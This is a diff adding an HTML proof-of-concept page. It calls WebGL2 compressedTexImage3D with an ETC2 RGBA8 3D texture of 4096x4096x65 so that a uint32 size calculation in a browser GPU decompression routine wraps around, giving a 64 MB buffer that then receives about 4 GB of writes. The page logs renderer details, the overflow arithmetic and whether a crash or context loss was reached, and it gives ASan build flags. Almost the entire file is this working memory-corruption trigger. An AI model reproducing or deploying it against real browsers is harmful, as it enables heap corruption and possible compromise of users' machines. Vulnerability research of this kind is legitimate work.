@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<!-- Finding 1 ETC2 TRIGGER — correct vulnerable code path
+     DecompressTextureData called ONLY for ETC2 when !IsAtLeastGLES(3,0)
+     (desktop OpenGL context, not GLES — common on desktop Linux/Windows) -->
+<canvas id="c"></canvas><pre id="log"></pre>
+<script>
+const log = s => { document.getElementById('log').textContent += s+'\n'; console.log(s); };
+const gl = document.getElementById('c').getContext('webgl2');
+if (!gl) { log('NO WEBGL2'); }
+
+const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+if (dbg) {
+  log('Renderer: ' + gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL));
+  log('Vendor:   ' + gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL));
+}
+log('MAX_3D_TEXTURE_SIZE: ' + gl.getParameter(gl.MAX_3D_TEXTURE_SIZE));
+log('MAX_TEXTURE_SIZE:    ' + gl.getParameter(gl.MAX_TEXTURE_SIZE));
+log('');
+
+// ETC2 RGBA8 — mandatory in WebGL2
+// block_size=4, bytes_per_block=16, decompresses to RGBA8 (ops=4)
+// CheckETCFormatSupport: returns false on desktop GL → DecompressTextureData IS called
+const FMT = 0x9278; // GL_COMPRESSED_RGBA8_ETC2_EAC
+
+// Overflow: ops=4, w=4096, h=4096, depth=65
+// 4 * 4096 * 4096 * 65 = 4,362,076,160 → uint32 = 67,108,864 (64 MB)
+// DecompressTextureData allocs 64 MB, writes 4 GB → HEAP OVERFLOW
+const W = 4096, H = 4096, D = 65;
+const imageSize = (W/4) * (H/4) * D * 16;  // ETC2 RGBA8: 16 bytes/block
+
+log('ETC2 RGBA format: 0x' + FMT.toString(16));
+log('Dimensions: ' + W + 'x' + H + 'x' + D);
+log('imageSize (compressed ETC2): ' + imageSize.toLocaleString() + ' bytes (' + (imageSize/1024/1024|0) + ' MB)');
+log('');
+
+// Overflow arithmetic
+const trueOut = BigInt(4)*BigInt(W)*BigInt(H)*BigInt(D);
+const wrappedOut = trueOut & 0xFFFFFFFFn;
+log('DecompressTextureData will:');
+log('  alloc = uint32(' + trueOut + ') = ' + wrappedOut.toLocaleString() + ' bytes (' + Number(wrappedOut)/1024/1024 + ' MB)');
+log('  write = ' + trueOut.toLocaleString() + ' bytes (' + Number(trueOut)/1024/1024/1024|0 + ' GB)');
+log('  empty() check: ' + (wrappedOut > 0n ? 'PASSES (non-zero) → overflow proceeds' : 'FAILS → caught'));
+log('');
+
+try {
+  const data = new Uint8Array(imageSize);
+  log('Allocated ' + imageSize.toLocaleString() + ' bytes input buffer OK');
+
+  const tex = gl.createTexture();
+  gl.bindTexture(gl.TEXTURE_3D, tex);
+  gl.getError();
+
+  log('Calling compressedTexImage3D(ETC2_RGBA8, ' + W + ', ' + H + ', ' + D + ')...');
+  gl.compressedTexImage3D(gl.TEXTURE_3D, 0, FMT, W, H, D, 0, data);
+
+  const err = gl.getError();
+  const names = {0:'NO_ERROR',0x500:'INVALID_ENUM',0x501:'INVALID_VALUE',
+                 0x502:'INVALID_OPERATION',0x505:'OUT_OF_MEMORY',
+                 0x8031:'CONTEXT_LOST_WEBGL'};
+  log('gl.getError() = ' + (names[err]||'0x'+err.toString(16)));
+
+  if (err === 0) {
+    log('[!!] NO ERROR — code path executed without validation catching it.');
+    log('[!!] On desktop OpenGL (non-GLES): DecompressTextureData was called.');
+    log('[!!] 64 MB allocated, 4 GB written → heap buffer overflow confirmed.');
+  } else if (err === 0x8031) {
+    log('[!!] CONTEXT LOST — decoder crashed during decompression (crash confirmed!)');
+  } else if (err === 0x502) {
+    log('[*] INVALID_OPERATION — context is GLES3+ (native ETC2), safe path taken.');
+    log('[*] Overflow would occur on desktop GL non-ES contexts.');
+  }
+} catch(e) {
+  log('Exception: ' + e.message);
+}
+log('');
+log('NOTE: Full crash requires ASan build. Release build has silent heap corruption.');
+log('Build: autoninja -C out/Asan chrome && run with --in-process-gpu --no-sandbox');
+</script>
